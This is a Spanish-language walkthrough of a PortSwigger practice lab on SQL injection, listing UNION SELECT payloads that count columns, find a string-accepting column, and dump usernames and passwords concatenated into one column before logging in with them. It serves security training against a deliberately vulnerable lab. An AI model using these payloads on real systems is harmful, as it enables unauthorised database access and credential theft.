# PortSwigger - SQL injection


## Lab: SQL injection UNION attack, retrieving multiple values in a single column


## Solución

Primero hacemos click en **Gifts** o en cualquier filtro de búsqueda.

![](./imagenes/lab6-1.png)

Veremos que se agrega una cadena que es vulnerable a SQL injection.

![](./imagenes/lab6-2.png)

Empezamos enumerando la cantidad de columnas.

```sql
' UNION SELECT null -- -
```

![](./imagenes/lab6-3.png)

Escribimos dos `null` y comprobamos que existen 2 columnas.

```sql
' UNION SELECT null,null -- -
```

![](./imagenes/lab6-4.png)

Ahora verificamo si ambas columnas aceptan un string y nos damos cuenta que la primera columna no acepta un string.

```sql
' UNION SELECT 'a',null -- -
```

![](./imagenes/lab6-5.png)

Probamos con el segundo null y comprobamos que sí acepta strings.

```sql
' UNION SELECT null,'a' -- -
```

![](./imagenes/lab6-6.png)

Podemos enumerar uno a uno las columnas para obtener los nombres de usuario y contraseñas.

```sql
' UNION SELECT null,username from users -- -
```

![](./imagenes/lab6-7.png)

```sql
' UNION SELECT null,password from users -- -
```

![](./imagenes/lab6-8.png)

Pero la idea del laboratorio es practicar una forma de obtener las dol columnas en una sola query. Para eso podemos usar el símbolo `||` que sirve para unir dos columnas en  SQL.

```sql
' UNION SELECT null,password||username from users -- -
```

![](./imagenes/lab6-9.png)

Podemos separar de mejor forma las dos columnas agregando un símbolo entre las dos columnas. Separaremos ambas columnas con: `||':'||`.

```sql
' UNION SELECT null,password||':'||username from users -- -
```

![](./imagenes/lab6-10.png)

Con esta información vamos a **My account**.

![](./imagenes/lab6-11.png)

Iniciamos sesión con las credenciales que obtuvimos anteriormente.

![](./imagenes/lab6-12.png)

Y resolvemos el lab.

![](./imagenes/lab6-13.png)





